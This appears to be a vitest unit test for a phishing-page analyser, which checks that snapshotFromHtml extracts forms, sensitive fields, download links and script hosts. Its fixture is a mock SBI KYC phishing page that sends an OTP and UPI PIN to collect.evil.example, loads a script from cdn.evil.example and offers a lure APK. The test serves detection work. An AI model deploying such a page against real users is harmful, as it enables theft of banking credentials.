import { describe, expect, it } from "vitest";
import { snapshotFromHtml } from "../src/index.js";

describe("reading raw HTML", () => {
  it("extracts text, forms, sensitive fields, installers and scripts", () => {
    const html = `<html><head><title>SBI &amp; KYC Update</title><script src="https://cdn.evil.example/x.js"></script></head>
      <body><h1>Update KYC</h1><p>Your account will be blocked today.</p>
      <form action="https://collect.evil.example/p"><label for="o">Enter OTP</label><input id="o" name="code">
      <input type="password" name="pin" placeholder="UPI PIN"></form>
      <a href="/files/SBI_Reward.apk">Download app</a><script>var hidden = "not text";</script></body></html>`;
    const s = snapshotFromHtml(html, "https://sbi-kyc.example/update");
    expect(s.title).toBe("SBI & KYC Update");
    expect(s.text).toContain("Your account will be blocked today.");
    expect(s.text).not.toContain("not text");
    expect(s.hasPasswordField).toBe(true);
    expect(s.signals!.forms[0]).toEqual({ actionHost: "collect.evil.example", hasPassword: true });
    expect(s.signals!.sensitiveFields).toEqual(expect.arrayContaining(["otp", "upi-pin"]));
    expect(s.signals!.downloadLinks).toEqual(["https://sbi-kyc.example/files/SBI_Reward.apk"]);
    expect(s.signals!.scriptHosts).toEqual(["cdn.evil.example"]);
  });
});
